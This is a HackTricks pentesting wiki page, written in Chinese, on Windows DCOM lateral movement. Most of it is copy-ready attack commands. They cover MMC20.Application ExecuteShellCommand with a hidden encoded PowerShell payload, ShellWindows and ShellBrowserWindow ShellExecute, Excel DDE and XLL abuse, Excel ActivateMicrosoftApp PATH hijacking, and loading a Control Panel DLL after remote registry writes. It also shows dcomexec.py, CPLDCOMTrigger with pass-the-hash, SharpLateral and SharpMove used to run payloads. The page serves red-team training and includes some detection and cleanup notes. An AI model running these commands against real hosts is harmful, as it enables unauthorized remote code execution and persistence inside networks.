# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement 很有吸引力，因为它会复用通过 RPC/DCOM 暴露的现有 COM servers，而不是创建 service 或 scheduled task。实际上，这意味着初始连接通常从 TCP/135 开始，随后转移到动态分配的高位 RPC 端口。

## 前置条件与注意事项

- 通常需要在目标上拥有 local administrator 上下文，并且远程 COM server 必须允许远程 launch/activation。
- 自 **2023 年 3 月 14 日** 起，Microsoft 对受支持的系统强制实施 DCOM hardening。请求较低 activation authentication level 的旧客户端可能会失败，除非它们协商到至少 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`。现代 Windows 客户端通常会自动提升该级别，因此当前的 tooling 通常仍可正常工作。<sup>[[3]](#references)</sup>
- 手动或 scripted DCOM execution 通常需要 TCP/135 以及目标的动态 RPC 端口范围。如果使用 Impacket 的 `dcomexec.py` 并且希望获取命令输出，通常还需要能够通过 SMB 访问 `ADMIN$`（或其他可读写的 share）。
- 如果 RPC/DCOM 正常工作但 SMB 被阻止，`dcomexec.py -nooutput` 仍可用于 blind execution。

快速检查：
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

有关此 technique 的更多信息，请查看[原始 MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)。<sup>[[1]](#references)</sup>

分布式组件对象模型 (DCOM) 对象为基于网络的对象交互提供了有趣的能力。Microsoft 为 DCOM 和组件对象模型 (COM) 提供了全面的文档，分别可在[此处查看 DCOM 文档](https://msdn.microsoft.com/en-us/library/cc226801.aspx)和[此处查看 COM 文档](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)。可以使用以下 PowerShell 命令获取 DCOM applications 列表：
```bash
Get-CimInstance Win32_DCOMApplication
```
COM 对象 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) 支持对 MMC 管理单元操作进行 scripting。值得注意的是，该对象在 `Document.ActiveView` 下包含一个 `ExecuteShellCommand` 方法。有关此方法的更多信息，请参阅[此处](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)。运行以下命令进行检查：<sup>[[6]](#references)</sup>

此功能支持通过 DCOM application over network 执行命令。要以 admin 身份远程与 DCOM 交互，可以使用 PowerShell，如下所示：
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
此命令连接到 DCOM 应用程序并返回 COM 对象的实例。随后可以调用 ExecuteShellCommand 方法，在远程主机上执行进程。该过程包括以下步骤：

检查方法：
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
获取 RCE：
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最后一个参数是窗口样式。`7` 会使窗口保持最小化状态。从实际操作角度看，基于 MMC 的执行通常会导致远程 `mmc.exe` 进程生成你的 payload，这与下面由 Explorer 支持的对象有所不同。

## ShellWindows & ShellBrowserWindow

**有关此 technique 的更多信息，请查看原始文章 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

已确认 **MMC20.Application** 对象缺少显式的 "LaunchPermissions"，因此默认使用允许 Administrators 访问的权限。有关更多详细信息，可以查看[此处](https://twitter.com/tiraniddo/status/817532039771525120)的讨论，并建议使用 [@tiraniddo](https://twitter.com/tiraniddo) 的 OleView .NET 来筛选没有显式 Launch Permission 的对象。

由于缺少显式 Launch Permissions，特别指出了两个对象：`ShellBrowserWindow` 和 `ShellWindows`。`HKCR:\AppID\{guid}` 下不存在 `LaunchPermission` 注册表项，表示没有显式权限。

与 `MMC20.Application` 相比，从 OPSEC 角度看，这些对象通常更加隐蔽，因为命令通常会在远程主机上成为 `explorer.exe` 的子进程，而不是 `mmc.exe` 的子进程。

### ShellWindows

对于没有 ProgID 的 `ShellWindows`，.NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 可以使用其 AppID 实例化对象。此过程利用 OleView .NET 获取 `ShellWindows` 的 CLSID。实例化后，可以通过 `WindowsShell.Item` 方法进行交互，进而调用类似 `Document.Application.ShellExecute` 的方法。

文中提供了用于实例化对象并远程执行命令的 PowerShell 命令示例：
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` 类似，但你可以通过其 CLSID 直接实例化它，并 pivot 到 `Document.Application.ShellExecute`：
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### 使用 Excel DCOM Objects 进行横向移动

可以通过利用 DCOM Excel objects 实现横向移动。有关详细信息，建议阅读 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) 中关于通过 DCOM 利用 Excel DDE 进行横向移动的讨论。<sup>[[5]](#references)</sup>

Empire project 提供了一个 PowerShell script，通过操纵 DCOM objects 演示如何利用 Excel 进行远程代码执行（RCE）。以下是该 script 中的代码片段，源自 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)，展示了滥用 Excel 执行 RCE 的不同方法：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
近期研究通过 `Excel.Application` 的 `ActivateMicrosoftApp()` 方法扩展了这一领域。其核心思路是：Excel 可以通过搜索系统 `PATH`，尝试启动 FoxPro、Schedule Plus 或 Project 等旧版 Microsoft 应用程序。如果 operator 能够将具有这些预期名称之一的 payload 放置在目标 `PATH` 中的可写位置，Excel 就会执行它。<sup>[[4]](#references)</sup>

此变体的要求：

- 目标上的 Local admin 权限
- 目标上已安装 Excel
- 能够将 payload 写入目标 `PATH` 中的可写目录

利用 FoxPro 查找机制（`FOXPROW.exe`）的实际示例：
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
如果攻击主机未注册本地 `Excel.Application` ProgID，则改用 CLSID 实例化远程对象：
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
实际观察到被滥用的值：

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 加载已注册的 Control Panel DLL

`COpenControlPanel` 类（CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`）公开了 `IOpenControlPanel`（IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`）。其 `Open()` 方法会导致远程 `dllhost.exe` 加载注册在 `Control Panel\Cpls` 键下的 Control Panel DLL。在经过测试的系统中，该类没有显式的启动/访问权限，因此会继承默认的 DCOM 策略（通常要求管理员才能进行远程激活）。任意随机项目名称都足以使 `Open()` 处理已注册的 DLL；payload 不需要使用 `.cpl` 扩展名，但必须是架构正确的有效 DLL。<sup>[[7]](#references)</sup>

该 primitive 是 **stage-and-trigger**，而不是仅执行命令：首先将 DLL 复制到目标并创建一个指向它的 `REG_EXPAND_SZ` 值，然后通过 DCOM 激活该对象。例如，在具有管理员权限的 Windows 上下文中：<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
公开的 [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) 客户端使用 Impacket 实现了未公开的 DCOM 调用。只需提供任意控制面板项名称即可；即使 `dllhost.exe` 已加载 DLL，客户端仍可能报告 RPC 错误。<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
从操作角度看，此路径还需要 file-write channel 和 remote registry access，因此比 `MMC20`/`ShellWindows` 更容易产生噪声。它会造成 persistence side effect，因为之后打开 Control Panel 时可能再次加载同一条目。执行后删除该值，并结合 `dllhost.exe` 中异常的 DLL 加载，排查意外出现的 `Control Panel\Cpls` 值。<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Lateral Movement 自动化工具

以下两个工具可用于自动化这些技术：

- **Invoke-DCOM.ps1**：Empire 项目提供的 PowerShell 脚本，可简化调用不同方法以在远程机器上执行代码。此脚本可在 Empire GitHub repository 中获取。

- **SharpLateral**：用于远程执行代码的工具，可使用以下命令：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 自动化工具

- Powershell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 可以轻松调用所有已注释的方式，在其他机器上执行代码。
- 你可以使用 Impacket 的 `dcomexec.py`，通过 DCOM 在远程系统上执行命令。当前版本支持 `ShellWindows`、`ShellBrowserWindow` 和 `MMC20`，默认使用 `ShellWindows`。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- 你也可以使用 [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [使用 MMC20.Application COM Object 进行 Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [通过 DCOM 进行 Lateral Movement：第二回合](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—管理 Windows DCOM Server Security Feature Bypass (CVE-2021-26414) 的变更](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement：滥用 DCOM Excel Application 的能力](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [利用 Excel DDE 通过 DCOM 进行 Lateral Movement](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [使用 DCOM objects 进行远程命令执行](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
